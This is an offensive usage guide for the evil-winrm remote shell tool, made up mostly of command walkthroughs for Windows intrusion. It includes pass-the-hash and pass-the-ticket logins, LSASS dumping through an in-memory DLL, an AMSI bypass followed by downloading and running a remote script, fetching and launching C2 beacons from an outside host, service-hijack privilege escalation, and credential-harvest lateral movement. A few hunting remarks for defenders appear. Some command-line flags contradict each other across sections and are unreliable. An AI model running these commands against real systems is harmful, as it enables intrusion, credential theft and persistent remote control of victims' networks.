# evil-winrm — Hands-On Use Cases

Every scenario below establishes an interactive WinRM session — the fundamental difference from `psexec.py` and `wmiexec.py`. Even in "one-off command" scenarios, evil-winrm creates a persistent runspace and maintains state; it simply exits after one command instead of remaining open for interactive reuse. MITRE ATT&CK technique(s) are tagged per scenario.

## Contents
- [Interactive SYSTEM Shell via Cleartext Credentials](#interactive-system-shell-via-cleartext-credentials)
- [Interactive Shell via Pass-the-Hash](#interactive-shell-via-pass-the-hash)
- [Interactive Shell via Kerberos (Pass-the-Ticket)](#interactive-shell-via-kerberos-pass-the-ticket)
- [Interactive Shell via Kerberos Keytab](#interactive-shell-via-kerberos-keytab)
- [Non-Interactive Single Command](#non-interactive-single-command)
- [Uploading a Staged Payload](#uploading-a-staged-payload)
- [In-Memory Binary Execution via Invoke-Binary](#in-memory-binary-execution-via-invoke-binary)
- [In-Memory DLL Loading and Execution](#in-memory-dll-loading-and-execution)
- [AMSI Bypass + PowerShell Script Execution](#amsi-bypass--powershell-script-execution)
- [Service Enumeration for Local Privilege Escalation](#service-enumeration-for-local-privilege-escalation)
- [Staged C2 Delivery (Cobalt Strike / Sliver)](#staged-c2-delivery-cobalt-strike--sliver)
- [Chained Lateral Movement After Credential Harvesting](#chained-lateral-movement-after-credential-harvesting)
- [WinRM on Custom Port](#winrm-on-custom-port)
- [Certificate-Based Authentication](#certificate-based-authentication)

---

## Interactive SYSTEM Shell via Cleartext Credentials

**MITRE ATT&CK:** [T1021.006](https://attack.mitre.org/techniques/T1021/006/) (Remote Services: Windows Remote Management) · [T1059.001](https://attack.mitre.org/techniques/T1059/001/) (Command and Scripting Interpreter: PowerShell)

The baseline case — the operator connects, receives a PowerShell prompt, and can type commands interactively.

```bash
# Confirm credentials are valid first (optional, recommended)
netexec winrm 10.10.10.5 -u 'jsmith' -p 'Summer2026!' --local-auth

# Connect to the target
evil-winrm -i 10.10.10.5 -u 'jsmith' -p 'Summer2026!'
```

Lands in a PowerShell prompt (typically as a non-elevated user):
```powershell
*Evil-WinRM* > whoami
CORP\jsmith

*Evil-WinRM* > [System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | 
  % { ([System.Security.Principal.SecurityIdentifier]($_)).Translate([System.Security.Principal.NTAccount]).Value }
# Shows group membership and current privileges

*Evil-WinRM* > $env:USERNAME
jsmith
```

**Execution context:** Runs as the authenticating user's security context, **not SYSTEM** (unlike `psexec.py`, which defaults to SYSTEM). To execute commands as SYSTEM, a UAC bypass or privilege escalation is needed first.

## Interactive Shell via Pass-the-Hash

**MITRE ATT&CK:** [T1550.002](https://attack.mitre.org/techniques/T1550/002/) (Use Alternate Authentication Material: Pass the Hash) · T1021.006 · T1059.001

No cleartext password needed — the NT hash alone (recovered from `secretsdump.py`, Mimikatz, or a DCSync) is sufficient.

```bash
# Format: -H <ntlm-hash> where ntlm-hash is the 32-hex NT hash
evil-winrm -i 10.10.10.5 -u 'administrator' \
  -H '8846f7eaee8fb117ad06bdd830b7586c'
```

The shell behavior is identical to the cleartext case — the authentication method is the only difference. The target sees NTLM authentication with the hash-derived credential instead of a cleartext password.

**Note:** LM hashes are ignored by WinRM; only the NT hash (the second half of a Mimikatz/secretsdump.py output like `aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c`) is used.

## Interactive Shell via Kerberos (Pass-the-Ticket)

**MITRE ATT&CK:** [T1550.003](https://attack.mitre.org/techniques/T1550/003/) (Use Alternate Authentication Material: Pass the Ticket) · T1021.006 · T1059.001

The highest stealth potential — Kerberos authentication leaves **no NTLM handshake** on the network, only a TGT/TGS exchange.

```bash
# Prerequisites:
# 1. A valid Kerberos ticket file (ccache format from Linux, or .kirbi from Mimikatz)
# 2. Export it to the environment
export KRB5CCNAME=/tmp/administrator.ccache

# 3. Connect using the ticket (no password needed)
evil-winrm -i dc01.corp.local -u 'administrator' -r 'CORP.LOCAL' -K /tmp/administrator.ccache
```

Once connected:
```powershell
*Evil-WinRM* > whoami
CORP\administrator

# The entire session is authenticated via Kerberos; no NTLM traffic occurs
```

**Critical:** The `-i` parameter **must be an FQDN** (not a bare IP) when using Kerberos, since the SPN (`HTTP/dc01.corp.local`) must resolve correctly for Kerberos to work.

**Ticket format handling:** evil-winrm auto-detects `.ccache` (MIT Kerberos, standard on Linux) vs. `.kirbi` (Mimikatz format, common from Windows-side dumping). If a `.kirbi` file is provided, evil-winrm converts it to ccache format automatically under the hood.

## Interactive Shell via Kerberos Keytab

**MITRE ATT&CK:** T1550.003 · T1021.006 · T1059.001

For service accounts with a long-lived keytab file (common in AD-integrated applications):

```bash
# A keytab is a file containing the account's encryption keys
# (Often stored in secure locations like /etc/krb5.keytab on Linux systems
# or exported from a Windows KDC via ktpass.exe)

evil-winrm -i dc01.corp.local -u 'svc-backup@corp.local' \
  -r 'CORP.LOCAL' -K /path/to/svc-backup.keytab
```

Internally, evil-winrm uses the keytab to derive a TGT on the operator's machine, then uses that TGT for WinRM authentication — the operator never handles the cleartext password.

## Non-Interactive Single Command

**MITRE ATT&CK:** T1021.006 · T1059.001 · [T1087.002](https://attack.mitre.org/techniques/T1087/002/) (Account Discovery: Domain Account) [if enumerating]

Useful for scripted execution across many hosts (credential validation, IOC sweeps, commands that don't require interactive feedback):

```bash
# Execute a single command and exit
evil-winrm -i 10.10.10.5 -u 'jsmith' -p 'Summer2026!' \
  -c 'powershell' -e 'whoami /all'
```

The runspace is still created and a single command is executed, but evil-winrm exits immediately after receiving the output instead of entering interactive mode. This is useful for **fleet-wide execution** (see below) and **credential validation**.

## Uploading a Staged Payload

**MITRE ATT&CK:** T1021.006 · [T1105](https://attack.mitre.org/techniques/T1105/) (Ingress Tool Transfer) · T1059.001

The operator connects interactively, then uses the `upload` command to transfer a file:

```bash
evil-winrm -i 10.10.10.5 -u 'jsmith' -p 'Summer2026!'
```

Once connected:
```powershell
*Evil-WinRM* > upload /opt/tools/sharphound.exe C:\Windows\Temp\sharphound.exe
Info: Uploading /opt/tools/sharphound.exe to C:\Windows\Temp\sharphound.exe

                                        
Data: 156 bytes of 156 bytes copied

Info: Upload successful!

*Evil-WinRM* > C:\Windows\Temp\sharphound.exe --mkdirs -d corp.local -dc dc01.corp.local
# Output from the executed tool...
```

The `upload` command shows a progress bar, making it suitable for large files. The file is transferred over the WinRM session (leveraging the PSRP/HTTP protocol), not SMB.

## In-Memory Binary Execution via Invoke-Binary

**MITRE ATT&CK:** T1021.006 · [T1202](https://attack.mitre.org/techniques/T1202/) (Indirect Command Execution) · T1059.001

Run a .NET assembly entirely in memory without writing it to disk:

```bash
evil-winrm -i 10.10.10.5 -u 'jsmith' -p 'Summer2026!'
```

Once connected (Invoke-Binary is pre-loaded):
```powershell
*Evil-WinRM* > Invoke-Binary /opt/tools/SharpKiller.exe -arg1 value1 -arg2 value2

# Or, specify the binary path as a local file on the target (if already present)
*Evil-WinRM* > Invoke-Binary C:\Windows\Temp\enum.exe --mkdirs -d corp.local

# Output from SharpKiller...
```

**Mechanics:** `Invoke-Binary` loads the binary as a .NET assembly in-memory, injects it into the current PowerShell process (not spawning `cmd.exe`), and captures its `Main()` return value and `Console.Out` stream back to the operator — all without touching disk.

**Evasion factor:** No on-disk file means no Prefetch, no filesystem artifacts, no file hash to match against blacklists. However, Sysmon Event ID 1 (Process Create) will **not** show a spawned binary at all — the assembly runs inside `powershell.exe` itself, which is why Sysmon 7 (Image Loaded) and 13 (Registry Value Set) become more relevant hunting targets.

## In-Memory DLL Loading and Execution

**MITRE ATT&CK:** T1021.006 · T1202 · T1059.001 · [T1104](https://attack.mitre.org/techniques/T1104/) (Multi-Stage Channels) [if loading from HTTP/SMB]

Load a DLL from multiple sources and execute an export function:

```bash
evil-winrm -i 10.10.10.5 -u 'jsmith' -p 'Summer2026!'
```

Once connected (Dll-Loader is pre-loaded):
```powershell
# From local filesystem
*Evil-WinRM* > Dll-Loader -filepath C:\Windows\Temp\mimilib.dll -funcname DumpLsass

# From an HTTP/HTTPS URL (Ingress Tool Transfer over WinRM + HTTP in one step)
*Evil-WinRM* > Dll-Loader -filepath http://198.51.100.7:8080/mimilib.dll -funcname DumpLsass

# From an SMB share (if accessible)
*Evil-WinRM* > Dll-Loader -filepath \\192.168.1.50\share\mimilib.dll -funcname DumpLsass
```

The DLL's export function (e.g., `DumpLsass`) is called with no arguments, and any return value is captured and printed.

## AMSI Bypass + PowerShell Script Execution

**MITRE ATT&CK:** T1021.006 · [T1562.001](https://attack.mitre.org/techniques/T1562/001/) (Impair Defenses: Disable or Modify Tools) · T1059.001

Bypass Windows Defender's AMSI detection and execute an obfuscated script:

```bash
evil-winrm -i 10.10.10.5 -u 'jsmith' -p 'Summer2026!'
```

Once connected:
```powershell
# 1. Apply the AMSI bypass (patches amsi.dll in-memory)
*Evil-WinRM* > Bypass-4MSI

# 2. Now load a script that would normally be caught by AMSI
*Evil-WinRM* > IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/evil-script.ps1')

# 3. Script executes without AMSI detection
# (Bypass-4MSI works by patching amsi.dll's AmsiScanBuffer function to immediately return AMSI_RESULT_CLEAN,
#  bypassing content scanning but not necessarily other EDR signatures)
```

**Note:** `Bypass-4MSI` patches the running PowerShell process's loaded `amsi.dll` in-memory; this **does not** affect other processes' AMSI instances or bypass EDR products that hook deeper into the process (like Defender for Endpoint). It is a **AMSI-specific** bypass, not a full EDR bypass.

## Service Enumeration for Local Privilege Escalation

**MITRE ATT&CK:** T1021.006 · [T1057](https://attack.mitre.org/techniques/T1057/) (Process Discovery) · [T1083](https://attack.mitre.org/techniques/T1083/) (File and Directory Discovery)

Use evil-winrm's `services` command to identify services the current user can modify (useful for local privilege escalation):

```bash
evil-winrm -i 10.10.10.5 -u 'jsmith' -p 'Summer2026!'
```

Once connected:
```powershell
*Evil-WinRM* > services

# Output shows a table of all services with columns:
# Name | Status | DisplayName | Permissions
# ─────────────────────────────────────────────────
# WinDefend | Running | Windows Defender Service | (no write access)
# VMToolsd | Running | VMware Tools | (jsmith has WRITE)
# MyCustomSvc | Stopped | My App Service | (jsmith has WRITE + CHANGE)
# ...

# This command does NOT require admin privileges — shows only permissions
# the current user actually possesses.

# Next step: modify a writable service to achieve privilege escalation
*Evil-WinRM* > sc.exe config MyCustomSvc binPath="cmd /c whoami > C:\Windows\Temp\proof.txt"
*Evil-WinRM* > net start MyCustomSvc
```

## Staged C2 Delivery (Cobalt Strike / Sliver)

**MITRE ATT&CK:** T1021.006 · T1059.001 · T1105 · [T1571](https://attack.mitre.org/techniques/T1571/) (Non-Standard Port) [if C2 uses custom port]

Use the WinRM shell to download and execute a secondary payload:

```bash
evil-winrm -i 10.10.10.5 -u 'jsmith' -p 'Summer2026!'
```

Once connected:
```powershell
# Option 1: Download via PowerShell DownloadFile, execute
*Evil-WinRM* > $wc = New-Object Net.WebClient
*Evil-WinRM* > $wc.DownloadFile('http://198.51.100.7/beacon.exe', 'C:\Windows\Temp\svc.exe')
*Evil-WinRM* > C:\Windows\Temp\svc.exe

# Option 2: Use the upload command to transfer the beacon
*Evil-WinRM* > upload /opt/beacons/beacon.exe C:\Windows\Temp\beacon.exe
*Evil-WinRM* > C:\Windows\Temp\beacon.exe

# Option 3: In-memory execution via Invoke-Binary (no disk write)
*Evil-WinRM* > Invoke-Binary /opt/beacons/beacon.exe

# In any case, the secondary payload (Cobalt Strike, Sliver, etc.) now
# runs inside the target's PowerShell process (or as a child if spawned via Invoke-Binary)
```

After the beacon connects back, the operator can disconnect from evil-winrm and operate through the C2 implant instead.

## Chained Lateral Movement After Credential Harvesting

**MITRE ATT&CK:** T1021.006 · T1059.001 · [T1555](https://attack.mitre.org/techniques/T1555/) [if credential material is harvested first]

The typical real-world workflow: harvest credentials, then pivot.

```bash
# 1. Use secretsdump.py to dump credentials from an already-compromised host
secretsdump.py CORP/jsmith:Summer2026!@10.10.10.20 -sam -system

# 2. Recover a local admin hash, e.g., `Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c`

# 3. Use that hash to pivot to the next host via evil-winrm
evil-winrm -i 10.10.10.21 -u 'Administrator' \
  -H '8846f7eaee8fb117ad06bdd830b7586c'

# 4. Now running commands on the second host
*Evil-WinRM* > Get-ADComputer -Filter * | select name
# Discover the next target

# 5. Repeat: dump this host's credentials, move to the next
```

This chain (credential harvest → hash extraction → pass-the-hash to next host) is a signature pattern: `secretsdump.py`-shaped traffic against one host, followed within seconds by an `evil-winrm`/WinRM-shaped authentication against a *different* internal host, using the *same source IP* — a textbook lateral-movement incident.

## WinRM on Custom Port

**MITRE ATT&CK:** T1021.006 · [T1571](https://attack.mitre.org/techniques/T1571/) (Non-Standard Port)

Some hardened environments move WinRM from the default 5985/5986 to a non-standard port:

```bash
# Target is listening on port 5987 instead of 5985
evil-winrm -i 10.10.10.5 -u 'jsmith' -p 'Summer2026!' -P 5987

# Or, force HTTPS on a custom port
evil-winrm -i 10.10.10.5 -u 'jsmith' -p 'Summer2026!' -P 5987 -S
```

WinRM service listening on non-standard ports is **rare** but may be configured in heavily restricted environments. Port scanning or ASN discovery during recon typically uncovers non-standard WinRM ports.

## Certificate-Based Authentication

**MITRE ATT&CK:** T1021.006 · [T1552.004](https://attack.mitre.org/techniques/T1552/004/) (Unsecured Credentials: Private Keys) [if certificates are stolen/obtained]

When the target requires certificate-based (mutual TLS) authentication:

```bash
# Both a public certificate and private key are required
evil-winrm -i 10.10.10.5 \
  -c /path/to/cert.pem -k /path/to/key.pem \
  -S  # Force HTTPS
```

This is **rare in default Windows environments** but may be enforced in:
- Multi-organizational federation scenarios (e.g., cross-tenant Entra ID scenarios)
- Highly hardened government/financial networks
- Custom WinRM deployments with certificate pinning

Obtaining the certificate/key pair typically requires stealing them from the target's store or compromising a certificate authority first.

